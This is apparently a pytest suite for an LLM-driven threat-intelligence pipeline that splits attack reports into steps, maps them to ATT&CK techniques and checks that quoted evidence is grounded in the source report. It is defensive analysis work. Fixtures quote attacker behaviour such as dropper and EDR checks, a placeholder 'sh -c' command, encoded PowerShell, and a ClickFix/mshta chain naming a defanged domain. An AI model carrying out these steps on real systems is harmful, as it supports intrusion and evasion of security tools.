    def test_every_advertised_field_is_accepted(self):
        """Anything the LLM is told to emit must validate."""
        missing = self._schema_props() - set(ChunkItem.model_fields)
        assert not missing, (
            f"Tool schema advertises {sorted(missing)} but ChunkItem forbids "
            f"it — extra='forbid' will hard-fail the run when the LLM complies."
        )

    def test_no_validator_field_is_unreachable(self):
        """A field the LLM is never asked for is dead weight (or a typo)."""
        orphans = set(ChunkItem.model_fields) - self._schema_props()
        assert not orphans, (
            f"ChunkItem declares {sorted(orphans)} that the tool schema never "
            f"asks for — the LLM cannot populate it."
        )


class TestPreconditionValidation:
    """ChunkItem must accept the precondition the chunker is asked to emit."""

    @staticmethod
    def _chunk(**precondition):
        return {
            "text": "Dropper checks for Bun before downloading.",
            "sequence_index": 8,
            "behavioral_confidence": 0.8,
            "precondition": precondition,
        }

    def test_accepts_real_world_precondition(self):
        """Regression: this exact shape hard-failed a live 40-chunk run."""
        out = ChunkBehaviorsOutput.model_validate({"chunks": [self._chunk(
            description=(
                "Actor checks whether Bun is already installed on the victim "
                "system; if present, dropper skips the download and immediately "
                "runs bun Math_Symbol.js; if absent, dropper downloads Bun "
                "v1.3.13 from GitHub releases first."
            ),
            on_true_indices=[9],
            on_false_indices=[10],
        )]})
        pre = out.chunks[0].precondition
        assert pre.on_true_indices == [9]
        assert pre.on_false_indices == [10]

    def test_precondition_is_optional(self):
        out = ChunkBehaviorsOutput.model_validate({"chunks": [{
            "text": "No conditional here.",
            "sequence_index": 1,
            "behavioral_confidence": 0.9,
        }]})
        assert out.chunks[0].precondition is None

    def test_blank_description_validates_and_defers_to_finalize(self):
        """Malformed preconditions must not kill the whole run.

        _finalize_chunks drops a description-less precondition with a warning;
        validating strictly here would discard every other chunk instead.
        """
        out = ChunkBehaviorsOutput.model_validate({
            "chunks": [self._chunk(on_true_indices=[2])]
        })
        assert out.chunks[0].precondition.description == ""

    def test_unknown_pattern_type_validates_and_defers_to_finalize(self):
        """_finalize_chunks coerces an out-of-enum pattern_type to 'plain'."""
        out = ChunkBehaviorsOutput.model_validate({"chunks": [self._chunk(
            description="Actor checks OS version.",
            pattern="Windows 10+",
            pattern_type="not_a_real_type",
            on_true_indices=[2],
        )]})
        assert out.chunks[0].precondition.pattern_type == "not_a_real_type"

    def test_unknown_subfield_is_still_rejected(self):
        """Strictness inside precondition is what surfaces future drift."""
        with pytest.raises(ValidationError):
            ChunkBehaviorsOutput.model_validate({"chunks": [self._chunk(
                description="Actor checks something.",
                invented_field="nope",
            )]})


class TestFinalizeChunksPreconditions:
    """_finalize_chunks resolves precondition indices to chunk_ids and
    validates the on_true/on_false partition against precedes_ids."""

    def _base_chunks(self):
        # 3-chunk branch: ch-1 → {ch-2, ch-3}.
        return [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1], "source_excerpt": ""},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [1], "source_excerpt": ""},
        ]

    def test_resolves_indices_to_chunk_ids(self):
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "actor checks whether the host is domain-joined",
            "on_true_indices": [2],
            "on_false_indices": [3],
        }
        out = _finalize_chunks(chunks, "")
        pre = out[0]["precondition"]
        assert pre["on_true_ids"] == ["ch-2"]
        assert pre["on_false_ids"] == ["ch-3"]
        assert pre["description"] == "actor checks whether the host is domain-joined"

    def test_pattern_and_pattern_type_round_trip(self):
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "checks for Sense registry key",
            "pattern": "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Sense",
            "pattern_type": "regex",
            "on_true_indices": [2],
            "on_false_indices": [3],
        }
        out = _finalize_chunks(chunks, "")
        pre = out[0]["precondition"]
        assert pre["pattern_type"] == "regex"
        assert "Sense" in pre["pattern"]

    def test_invalid_pattern_type_collapses_to_plain(self):
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "checks Office version",
            "pattern": "Office.Version >= 2019",
            "pattern_type": "yaml",  # not in the allowed enum
            "on_true_indices": [2],
            "on_false_indices": [3],
        }
        out = _finalize_chunks(chunks, "")
        assert out[0]["precondition"]["pattern_type"] == "plain"

    def test_pattern_omitted_when_pattern_text_is_empty(self):
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "checks something",
            "pattern": "",
            "pattern_type": "regex",  # should be cleared since pattern is empty
            "on_true_indices": [2],
            "on_false_indices": [3],
        }
        out = _finalize_chunks(chunks, "")
        pre = out[0]["precondition"]
        assert pre["pattern"] is None
        assert pre["pattern_type"] is None

    def test_one_sided_partition_kept(self):
        # "if EDR present, abort" — only on_true is named, on_false stays empty.
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "checks for EDR presence",
            "on_true_indices": [2],
            "on_false_indices": [],
        }
        out = _finalize_chunks(chunks, "")
        pre = out[0]["precondition"]
        assert pre["on_true_ids"] == ["ch-2"]
        assert pre["on_false_ids"] == []

    def test_unknown_index_pruned_quietly(self):
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "checks something",
            "on_true_indices": [2, 99],  # 99 doesn't map to any chunk
            "on_false_indices": [3],
        }
        out = _finalize_chunks(chunks, "")
        pre = out[0]["precondition"]
        assert pre["on_true_ids"] == ["ch-2"]
        assert 99 not in pre["on_true_ids"]

    def test_non_successor_target_pruned_with_warning(self):
        # ch-1 → {ch-2, ch-3}; ch-3 is not a successor of ch-2 yet the LLM
        # references it in ch-2's precondition. Should be pruned.
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1], "source_excerpt": ""},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [1], "source_excerpt": ""},
        ]
        chunks[1]["precondition"] = {
            "description": "garbage condition",
            "on_true_indices": [3],   # ch-3 is NOT downstream of ch-2
            "on_false_indices": [],
        }
        out = _finalize_chunks(chunks, "")
        # Both sides pruned to empty → condition gets dropped entirely.
        assert out[1]["precondition"] is None

    def test_condition_dropped_when_both_sides_empty(self):
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "vacuous condition",
            "on_true_indices": [99],
            "on_false_indices": [98],
        }
        out = _finalize_chunks(chunks, "")
        assert out[0]["precondition"] is None

    def test_condition_dropped_when_description_missing(self):
        chunks = self._base_chunks()
        chunks[0]["precondition"] = {
            "description": "   ",  # whitespace only
            "on_true_indices": [2],
            "on_false_indices": [3],
        }
        out = _finalize_chunks(chunks, "")
        assert out[0]["precondition"] is None

    def test_no_precondition_left_untouched(self):
        chunks = self._base_chunks()
        out = _finalize_chunks(chunks, "")
        # None of the chunks set a precondition; the field stays None / absent.
        for c in out:
            assert c.get("precondition") is None


class TestChainRootBackstop:
    """_finalize_chunks must respect chain_root=True and skip the
    orphan-link backstop so multi-intrusion sources keep their chains
    disconnected. Also covers chain_label propagation along precedes
    edges within a chain."""

    def test_chain_root_disconnected_orphan_preserved(self):
        """A chain_root chunk with empty preds must NOT get linked to
        the prior chunk by the orphan backstop."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [],
             "source_excerpt": "", "chain_root": False, "chain_label": "primary"},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1],
             "source_excerpt": "", "chain_root": False, "chain_label": ""},
            # Veeam-style separate chain: empty preds, chain_root=True.
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [],
             "source_excerpt": "", "chain_root": True, "chain_label": "Veeam intrusion"},
            {"chunk_id": "ch-4", "sequence_index": 4, "predecessor_indices": [3],
             "source_excerpt": "", "chain_root": False, "chain_label": ""},
        ]
        out = _finalize_chunks(chunks, "")
        ch3 = next(c for c in out if c["chunk_id"] == "ch-3")
        # The backstop would have linked ch-3 to ch-2 if chain_root were
        # ignored. Confirm the chain stays disconnected.
        assert ch3["predecessor_indices"] == []

    def test_chain_root_propagates_label_to_successors(self):
        """chain_label on the root flows down the precedes graph to
        chunks that don't have an explicit label."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [],
             "source_excerpt": "", "chain_root": False, "chain_label": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [],
             "source_excerpt": "", "chain_root": True, "chain_label": "Veeam"},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [2],
             "source_excerpt": "", "chain_root": False, "chain_label": ""},
            {"chunk_id": "ch-4", "sequence_index": 4, "predecessor_indices": [3],
             "source_excerpt": "", "chain_root": False, "chain_label": ""},
        ]
        out = _finalize_chunks(chunks, "")
        labels = {c["chunk_id"]: c.get("chain_label", "") for c in out}
        assert labels["ch-2"] == "Veeam"
        assert labels["ch-3"] == "Veeam"
        assert labels["ch-4"] == "Veeam"
        # ch-1 was never linked into the Veeam chain — keeps its empty label.
        assert labels["ch-1"] == ""

    def test_explicit_chain_label_not_overridden(self):
        """If a chunk already carries a chain_label, BFS propagation
        from another root must NOT overwrite it."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [],
             "source_excerpt": "", "chain_root": True, "chain_label": "Primary"},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1],
             "source_excerpt": "", "chain_root": False, "chain_label": "explicit-override"},
        ]
        out = _finalize_chunks(chunks, "")
        ch2 = next(c for c in out if c["chunk_id"] == "ch-2")
        assert ch2["chain_label"] == "explicit-override"


class TestClassifySourceProvenance:
    """_classify_source_provenance buckets a chunk's source span into
    prose / code / figure / paraphrased based on parsed_text region markers."""

    def test_paraphrased_when_span_is_none(self):
        assert _classify_source_provenance("any text", None) == "paraphrased"

    def test_paraphrased_on_invalid_span(self):
        assert _classify_source_provenance("text", (-1, 5)) == "paraphrased"
        assert _classify_source_provenance("text", (5, 5)) == "paraphrased"
        assert _classify_source_provenance("text", (10, 5)) == "paraphrased"

    def test_prose_default(self):
        text = "The actor issued commands to enumerate the target machine."
        # span over the whole prose sentence
        assert _classify_source_provenance(text, (0, len(text))) == "prose"

    def test_code_inside_triple_backtick_fence(self):
        text = "Intro prose.\n```\ncd C:\\programdata\ndir >> abc.pdf\n```\nMore prose."
        # Find the cd command range
        start = text.find("cd C:")
        end = text.find("\n```\nMore prose.")
        assert _classify_source_provenance(text, (start, end)) == "code"

    def test_prose_when_span_outside_code_fence(self):
        text = "Intro prose.\n```\ncode\n```\nMore prose."
        start = text.find("More prose.")
        end = start + len("More prose.")
        assert _classify_source_provenance(text, (start, end)) == "prose"

    def test_figure_inside_figure_block(self):
        text = (
            "Prose before.\n"
            "[FIGURE fig-1 — diagram, page 2, \"Attack chain\"]\n"
            "Step 1: phishing email\nStep 2: payload deployment\n"
            "[/FIGURE fig-1]\n"
            "Prose after."
        )
        start = text.find("Step 1:")
        end = text.find("[/FIGURE fig-1]")
        assert _classify_source_provenance(text, (start, end)) == "figure"

    def test_prose_when_span_after_closed_figure(self):
        text = (
            "Intro.\n[FIGURE fig-1 — diagram, page 1]\nfig content\n[/FIGURE fig-1]\n"
            "After-figure prose."
        )
        start = text.find("After-figure prose.")
        end = start + len("After-figure prose.")
        assert _classify_source_provenance(text, (start, end)) == "prose"

    def test_figure_takes_precedence_over_code_when_nested(self):
        """A code fence INSIDE a figure block (vision-extracted code) still
        classifies as 'figure' — the fidelity ceiling is set by the figure
        boundary, not the inner code marker."""
        text = (
            "Intro.\n[FIGURE fig-1 — screenshot, page 3]\n"
            "```\nsh -c 'evil'\n```\n"
            "[/FIGURE fig-1]\n"
            "Tail."
        )
        start = text.find("sh -c")
        end = text.find("\n```\n[/FIGURE fig-1]")
        assert _classify_source_provenance(text, (start, end)) == "figure"

    def test_finalize_chunks_populates_provenance(self):
        """End-to-end: _finalize_chunks should set source_provenance on
        every chunk based on where the excerpt anchors."""
        text = (
            "Prose-anchored chunk text here.\n"
            "```\nverbatim-command\n```\n"
            "[FIGURE fig-1 — diagram, page 2]\n"
            "figure-text-here\n"
            "[/FIGURE fig-1]"
        )
        chunks = [
            {"chunk_id": "ch-prose", "sequence_index": 1, "predecessor_indices": [],
             "source_excerpt": "Prose-anchored chunk text here."},
            {"chunk_id": "ch-code", "sequence_index": 2, "predecessor_indices": [1],
             "source_excerpt": "verbatim-command"},
            {"chunk_id": "ch-figure", "sequence_index": 3, "predecessor_indices": [2],
             "source_excerpt": "figure-text-here"},
            {"chunk_id": "ch-paraphrased", "sequence_index": 4, "predecessor_indices": [3],
             "source_excerpt": "no such substring exists in source"},
        ]
        out = _finalize_chunks(chunks, text)
        by_id = {c["chunk_id"]: c for c in out}
        assert by_id["ch-prose"]["source_provenance"] == "prose"
        assert by_id["ch-code"]["source_provenance"] == "code"
        assert by_id["ch-figure"]["source_provenance"] == "figure"
        assert by_id["ch-paraphrased"]["source_provenance"] == "paraphrased"


class TestBuildRerunFeedbackContext:
    """_build_rerun_feedback_context renders chunk-gate rejection into prompt text."""

    def test_empty_returns_empty_string(self):
        assert _build_rerun_feedback_context(None) == ""
        assert _build_rerun_feedback_context({}) == ""

    def test_renders_reason_and_comments(self):
        out = _build_rerun_feedback_context({
            "reason": "missed_procedures",
            "comments": "Source mentions VSS deletion that was omitted",
        })
        assert "missed_procedures" in out
        assert "VSS deletion" in out
        assert "highest priority" in out.lower() or "highest-priority" in out.lower()

    def test_no_comments_still_includes_reason(self):
        out = _build_rerun_feedback_context({"reason": "bad_flow", "comments": ""})
        assert "bad_flow" in out

    def test_long_comments_truncated(self):
        long = "x" * 5000
        out = _build_rerun_feedback_context({"reason": "other", "comments": long})
        # Implementation caps at 1000 chars; verify the rendered block is bounded.
        assert len(out) < 2000

    def test_newlines_in_comments_replaced(self):
        out = _build_rerun_feedback_context({
            "reason": "other", "comments": "line one\nline two\nline three",
        })
        # Newlines inside the analyst comment shouldn't break the block.
        # The verbatim quote is on a single line; line breaks elsewhere are
        # part of the prompt template.
        assert "line one line two line three" in out


class TestExtractBehavioralText:
    """Tests for behavioral text extraction."""

    def test_filters_behavioral_only(self):
        sections = [
            {"text": "Attack description", "classification": "behavioral_narrative"},
            {"text": "IOC list", "classification": "indicator_data"},
            {"text": "More attack details", "classification": "behavioral_narrative"},
        ]
        text = _extract_behavioral_text(sections)
        assert "Attack description" in text
        assert "More attack details" in text
        assert "IOC list" not in text

    def test_no_behavioral_returns_empty(self):
        sections = [{"text": "metadata only", "classification": "metadata"}]
        assert _extract_behavioral_text(sections) == ""


class TestBuildEntityContext:
    """Tests for entity context builder."""

    def test_builds_from_entities(self):
        entities = [
            {"entity_type": "intrusion_set", "value": "APT29", "gate_action": "approve"},
            {"entity_type": "malware", "value": "Cobalt Strike", "gate_action": "approve"},
            {"entity_type": "tool", "value": "certutil", "gate_action": "remove"},  # removed
        ]
        ctx = _build_entity_context(entities)
        assert "APT29" in ctx
        assert "Cobalt Strike" in ctx
        assert "certutil" not in ctx  # removed entities excluded

    def test_empty_entities(self):
        assert _build_entity_context([]) == ""


# =============================================================================
# extract_techniques
# =============================================================================


class TestExtractTechniques:
    """Tests for the extract_techniques node."""

    @patch("app.nodes.llm.technique_extraction.call_llm", new_callable=AsyncMock)
    async def test_no_chunks_returns_empty(self, mock_call):
        state = {"chunks": [], "validated_entities": []}
        result = await extract_techniques(state)
        assert result["technique_mappings"] == {}
        mock_call.assert_not_called()


class TestTechniqueIdValidation:
    """Tests for ATT&CK technique ID validation."""

    def test_valid_parent_technique(self):
        assert TECHNIQUE_ID_RE.match("T1059")

    def test_valid_sub_technique(self):
        assert TECHNIQUE_ID_RE.match("T1059.001")

    def test_invalid_format_rejected(self):
        assert not TECHNIQUE_ID_RE.match("TA0001")
        assert not TECHNIQUE_ID_RE.match("T123")
        assert not TECHNIQUE_ID_RE.match("T1059.01")
        assert not TECHNIQUE_ID_RE.match("attack-pattern--abc")


class TestProcessTechniqueMappings:
    """Tests for technique mapping post-processing."""

    def test_valid_mappings_processed(self):
        raw = [{
            "chunk_id": "chk-001",
            "techniques": [
                {"technique_id": "T1190", "technique_name": "Test", "tactic": "initial-access", "confidence": 0.9},
            ],
        }]
        chunks = [{"chunk_id": "chk-001"}]
        result = _process_technique_mappings(raw, chunks)
        assert "chk-001" in result
        assert result["chk-001"][0]["technique_id"] == "T1190"
        assert result["chk-001"][0]["stix_id"] is None  # Not resolved yet

    def test_invalid_technique_id_skipped(self):
        raw = [{
            "chunk_id": "chk-001",
            "techniques": [
                {"technique_id": "FAKE123", "technique_name": "Fake", "tactic": "execution", "confidence": 0.5},
            ],
        }]
        chunks = [{"chunk_id": "chk-001"}]
        result = _process_technique_mappings(raw, chunks)
        # chk-001 has no valid techniques, so it's not in the result
        assert "chk-001" not in result

    def test_unknown_chunk_id_skipped(self):
        raw = [{
            "chunk_id": "chk-unknown",
            "techniques": [
                {"technique_id": "T1059", "technique_name": "Test", "tactic": "execution", "confidence": 0.9},
            ],
        }]
        chunks = [{"chunk_id": "chk-001"}]
        result = _process_technique_mappings(raw, chunks)
        assert "chk-unknown" not in result

    def test_confidence_clamped(self):
        raw = [{
            "chunk_id": "chk-001",
            "techniques": [
                {"technique_id": "T1059", "technique_name": "Test", "tactic": "execution", "confidence": 1.5},
            ],
        }]
        chunks = [{"chunk_id": "chk-001"}]
        result = _process_technique_mappings(raw, chunks)
        assert result["chk-001"][0]["confidence"] == 1.0

    def test_pick_carries_bucket_and_quote(self):
        """C+A+D pick step adds confidence_bucket + source_quote; both
        flow through _process_technique_mappings as first-class fields."""
        raw = [{
            "chunk_id": "chk-001",
            "techniques": [{
                "technique_id": "T1059.001",
                "technique_name": "PowerShell",
                "tactic": "execution",
                "confidence": 0.9,
                "confidence_bucket": "definite",
                "source_quote": "ran powershell.exe -enc",
                "rationale": "quote names PowerShell.",
            }],
        }]
        chunks = [{"chunk_id": "chk-001"}]
        result = _process_technique_mappings(raw, chunks)
        t = result["chk-001"][0]
        assert t["confidence_bucket"] == "definite"
        assert t["source_quote"] == "ran powershell.exe -enc"

    def test_pick_invalid_bucket_falls_back_to_probable(self):
        """Defensive: if the LLM emits an unknown bucket value, default
        to 'probable' so the pick still has a usable bucket."""
        raw = [{
            "chunk_id": "chk-001",
            "techniques": [{
                "technique_id": "T1059.001",
                "technique_name": "PowerShell",
                "tactic": "execution",
                "confidence": 0.7,
                "confidence_bucket": "made-up",
                "source_quote": "anything",
                "rationale": "x",
            }],
        }]
        chunks = [{"chunk_id": "chk-001"}]
        result = _process_technique_mappings(raw, chunks)
        assert result["chk-001"][0]["confidence_bucket"] == "probable"


class TestApplySourceQuoteCap:
    """The source_quote auto-cap downgrades picks whose quote is missing
    or doesn't appear verbatim in the chunk text. Per design decision A
    (flexible source quote with auto-cap), this preserves recall while
    parking weak picks in the 'possible' bucket for analyst review."""

    def _pick(self, **kwargs) -> dict:
        base = {
            "technique_id": "T1059.001",
            "technique_name": "PowerShell",
            "tactic": "execution",
            "confidence": 0.9,
            "confidence_bucket": "definite",
            "source_quote": "",
            "rationale": "x",
            "stix_id": None,
            "provenance": "llm",
        }
        base.update(kwargs)
        return base

    def test_empty_quote_caps_to_possible(self):
        from app.nodes.llm.technique_extraction import _apply_source_quote_cap
        chunk_text = "the operator ran powershell.exe -enc <b64>"
        mappings = {"chk-001": [self._pick(source_quote="")]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text})
        assert out["chk-001"][0]["confidence_bucket"] == "possible"
        assert out["chk-001"][0]["confidence"] <= 0.6

    def test_non_verbatim_quote_caps_to_possible(self):
        from app.nodes.llm.technique_extraction import _apply_source_quote_cap
        chunk_text = "the operator ran powershell.exe -enc <b64>"
        mappings = {"chk-001": [self._pick(source_quote="paraphrased description")]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text})
        assert out["chk-001"][0]["confidence_bucket"] == "possible"

    def test_verbatim_quote_keeps_original_bucket(self):
        from app.nodes.llm.technique_extraction import _apply_source_quote_cap
        chunk_text = "the operator ran powershell.exe -enc <b64>"
        mappings = {"chk-001": [self._pick(source_quote="ran powershell.exe -enc")]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text})
        assert out["chk-001"][0]["confidence_bucket"] == "definite"
        assert out["chk-001"][0]["confidence"] == 0.9

    def test_verbatim_match_provenance_exempt(self):
        """Verbatim_match-provenanced picks (from procedure_matcher) are
        exempt from the cap because their grounding comes from the matcher,
        not a chunk-text quote."""
        from app.nodes.llm.technique_extraction import _apply_source_quote_cap
        chunk_text = "the operator ran powershell.exe -enc <b64>"
        # Empty quote AND verbatim_match provenance -> not capped.
        mappings = {"chk-001": [self._pick(
            source_quote="",
            provenance="verbatim_match",
        )]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text})
        assert out["chk-001"][0]["confidence_bucket"] == "definite"
        assert out["chk-001"][0]["confidence"] == 0.9

    def test_already_possible_stays_possible(self):
        """A pick that already has bucket='possible' is left alone (no
        re-capping, no double-counted log line)."""
        from app.nodes.llm.technique_extraction import _apply_source_quote_cap
        chunk_text = "anything"
        mappings = {"chk-001": [self._pick(
            source_quote="",
            confidence_bucket="possible",
            confidence=0.5,
        )]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text})
        assert "bucket_capped" not in out["chk-001"][0]

    # --- report-grounding check -------------------------------------------
    # The checks above verify the quote against chunk.text, which the LLM
    # wrote. These verify it against the report, which it did not.

    # Synthetic, modeled on a campaign report. The report names the ClickFix brand but
    # never describes the copy-paste mechanism.
    REPORT = (
        "UNC0003 deployed a CLICKFIX fake CAPTCHA on compromised websites. "
        "The lure directed victims to a page hosting a malicious command. "
        "Mshta.exe subsequently executed the staged cont.hta payload from "
        "the remote domain poqwserty[.]com."
    )

    def test_fabricated_quote_capped_when_unsupported_by_report(self):
        """The regression this check exists for: the chunker invented a
        mechanism the report never states, and the picker quoted the
        chunker's invention as its evidence. Verbatim in the chunk, absent
        from the report."""
        from app.nodes.llm.technique_extraction import (
            _apply_source_quote_cap, _build_source_grounding_tokens,
        )
        chunk_text = (
            "UNC0003 compromised websites with a ClickFix lure, socially "
            "engineering the user into copying and pasting an "
            "attacker-supplied command into the Windows Run dialog"
        )
        quote = (
            "socially engineering the user into copying and pasting an "
            "attacker-supplied command into the Windows Run dialog"
        )
        assert quote in chunk_text  # the old check passes it
        tokens = _build_source_grounding_tokens({"parsed_text": self.REPORT})
        mappings = {"chk-001": [self._pick(
            technique_id="T1204.004", source_quote=quote,
        )]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text}, tokens)
        pick = out["chk-001"][0]
        assert pick["confidence_bucket"] == "possible"
        assert pick["confidence"] <= 0.6
        assert pick["quote_unsupported_by_source"] is True
        assert pick["quote_source_support"] < 0.5

    def test_faithful_paraphrase_survives(self):
        """A rewrite that reuses the report's own nouns keeps its bucket —
        the check must not punish the chunker for paraphrasing, which it
        does by design."""
        from app.nodes.llm.technique_extraction import (
            _apply_source_quote_cap, _build_source_grounding_tokens,
        )
        chunk_text = (
            "Mshta.exe executed the staged cont.hta payload, completing "
            "the execution sequence"
        )
        tokens = _build_source_grounding_tokens({"parsed_text": self.REPORT})
        mappings = {"chk-001": [self._pick(
            technique_id="T1218.005",
            source_quote="Mshta.exe executed the staged cont.hta payload",
        )]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text}, tokens)
        assert out["chk-001"][0]["confidence_bucket"] == "definite"
        assert out["chk-001"][0]["confidence"] == 0.9

    def test_short_quote_skips_ratio_check(self):
        """Under _QUOTE_MIN_TOKENS the ratio is too coarse to mean anything,
        so the chunk-substring rule is left to govern."""
        from app.nodes.llm.technique_extraction import (
            _apply_source_quote_cap, _build_source_grounding_tokens,
        )
        chunk_text = "the operator used zzzz yyyy"
        tokens = _build_source_grounding_tokens({"parsed_text": self.REPORT})
        mappings = {"chk-001": [self._pick(source_quote="zzzz yyyy")]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text}, tokens)
        assert out["chk-001"][0]["confidence_bucket"] == "definite"

    def test_omitting_source_tokens_keeps_legacy_behaviour(self):
        """Two-arg calls (and an empty corpus) skip the report check rather
        than failing every pick closed."""
        from app.nodes.llm.technique_extraction import _apply_source_quote_cap
        chunk_text = "wholly unrelated prose about aardvarks and bicycles"
        mappings = {"chk-001": [self._pick(source_quote="aardvarks and bicycles")]}
        out = _apply_source_quote_cap(mappings, {"chk-001": chunk_text})
        assert out["chk-001"][0]["confidence_bucket"] == "definite"
        out2 = _apply_source_quote_cap(
            {"chk-001": [self._pick(source_quote="aardvarks and bicycles")]},
            {"chk-001": chunk_text},
            set(),
        )
        assert out2["chk-001"][0]["confidence_bucket"] == "definite"


class TestBuildSourceGroundingTokens:
    """The grounding corpus deliberately excludes the vendor's own ATT&CK
    mapping table. Otherwise a model could quote the answer key back as
    evidence for the technique the table names."""

    def test_technique_reference_section_excluded(self):
        from app.nodes.llm.technique_extraction import _build_source_grounding_tokens
        state = {"classified_sections": [
            {"classification": "behavioral_narrative",
             "text": "The actor executed mshta against the staged payload."},
            {"classification": "technique_reference",
             "text": "T1204.004 Malicious Copy and Paste"},
        ]}
        tokens = _build_source_grounding_tokens(state)
        assert "mshta" in tokens
        assert "paste" not in tokens
        assert "malicious" not in tokens

    def test_detection_logic_section_excluded(self):
        from app.nodes.llm.technique_extraction import _build_source_grounding_tokens
        state = {"classified_sections": [
            {"classification": "behavioral_narrative", "text": "curl downloaded the payload"},
            {"classification": "detection_logic",
             "text": "title: Kerberoasting Activity detection rule"},
        ]}
        tokens = _build_source_grounding_tokens(state)
        assert "downloaded" in tokens
        assert "kerberoasting" not in tokens

    def test_falls_back_to_parsed_text(self):
        from app.nodes.llm.technique_extraction import _build_source_grounding_tokens
        tokens = _build_source_grounding_tokens(
            {"parsed_text": "the actor executed mshta"},
        )
        assert "mshta" in tokens

    def test_no_text_returns_empty_set(self):
        """Empty means 'check disabled', not 'fail everything'."""
        from app.nodes.llm.technique_extraction import _build_source_grounding_tokens
        assert _build_source_grounding_tokens({}) == set()
        assert _build_source_grounding_tokens({"parsed_text": "   "}) == set()


class TestSplitByBucket:
    """Bundle vs review-lane split based on confidence_bucket. The bundle
    feed gets 'definite' + 'probable'; 'possible' is for Gate 1 review."""

    def _pick(self, bucket: str, technique_id: str = "T1059.001") -> dict:
        return {
            "technique_id": technique_id,
            "technique_name": "PowerShell",
            "tactic": "execution",
            "confidence": 0.9,
            "confidence_bucket": bucket,
            "source_quote": "x",
            "rationale": "y",
            "stix_id": None,
            "provenance": "llm",
        }

    def test_definite_lands_in_bundle(self):
        from app.nodes.llm.technique_extraction import _split_by_bucket
        bundle, review = _split_by_bucket({"chk-001": [self._pick("definite")]})
        assert "chk-001" in bundle
        assert "chk-001" not in review

    def test_probable_lands_in_bundle(self):
        from app.nodes.llm.technique_extraction import _split_by_bucket
        bundle, review = _split_by_bucket({"chk-001": [self._pick("probable")]})
        assert "chk-001" in bundle
        assert "chk-001" not in review

    def test_possible_lands_in_review(self):
        from app.nodes.llm.technique_extraction import _split_by_bucket
        bundle, review = _split_by_bucket({"chk-001": [self._pick("possible")]})
        assert "chk-001" not in bundle
        assert "chk-001" in review

    def test_mixed_chunk_split_per_pick(self):
        """One chunk, three picks across all buckets — bundle gets 2,
        review gets 1, both keyed by the same chunk_id.

        The three picks must be DISTINCT techniques. _pick defaults every
        pick to T1059.001, and _split_by_bucket now collapses repeats of one
        technique on one chunk (a duplicate reaching Gate 1 is what killed
        one ransomware run). Same-id picks would therefore collapse to one and
        test the dedup instead of the split.
        """
        from app.nodes.llm.technique_extraction import _split_by_bucket
        mappings = {"chk-001": [
            self._pick("definite", technique_id="T1059.001"),
            self._pick("probable", technique_id="T1047"),
            self._pick("possible", technique_id="T1482"),
        ]}
        bundle, review = _split_by_bucket(mappings)
        assert len(bundle["chk-001"]) == 2
        assert len(review["chk-001"]) == 1


class TestFormatChunksForPromptProposalInjection:
    """Step 2.6 propose-step output threads behavior_description + tactic
    + proposed_techniques into the pick prompt per-chunk so the LLM's own
    earlier reasoning anchors its picks."""

    def test_chunks_without_proposals_omit_propose_block(self):
        from app.nodes.llm.technique_extraction import _format_chunks_for_prompt
        text = _format_chunks_for_prompt(
            [{"chunk_id": "c1", "text": "did something", "sequence_index": 1}],
        )
        assert "PROPOSED BEHAVIOR" not in text

    def test_proposals_render_per_chunk(self):
        from app.nodes.llm.technique_extraction import _format_chunks_for_prompt
        text = _format_chunks_for_prompt(
            [{"chunk_id": "c1", "text": "did something", "sequence_index": 1}],
            proposals_by_chunk={"c1": {
                "behavior_description": "User Execution via fake CAPTCHA",
                "objective": "Execute attacker code via copy-paste lure.",
                "tactics": ["initial-access", "execution"],
                "proposed_techniques": ["T1204.004", "T1059.001"],
            }},
        )
        # Objective + multi-tactic + behavior + proposals all surface
        assert "PROPOSED OBJECTIVE: Execute attacker code via copy-paste lure." in text
        assert "PROPOSED BEHAVIOR (step 1): User Execution via fake CAPTCHA" in text
        assert "PROPOSED TACTICS" in text
        assert "initial-access, execution" in text
        assert "T1204.004" in text

    def test_legacy_singular_tactic_field_still_renders(self):
        """Defensive: in-flight checkpoints from before stage 1 may carry
        the legacy singular `tactic` field. The formatter coerces it into
        a single-element tactics list so the pick prompt still gets a
        rendered TACTICS line."""
        from app.nodes.llm.technique_extraction import _format_chunks_for_prompt
        text = _format_chunks_for_prompt(
            [{"chunk_id": "c1", "text": "x", "sequence_index": 1}],
            proposals_by_chunk={"c1": {
                "behavior_description": "b",
                "objective": "o",
                "tactic": "execution",  # legacy singular key
                "proposed_techniques": [],
            }},
        )
        assert "PROPOSED TACTICS" in text
        assert "execution" in text


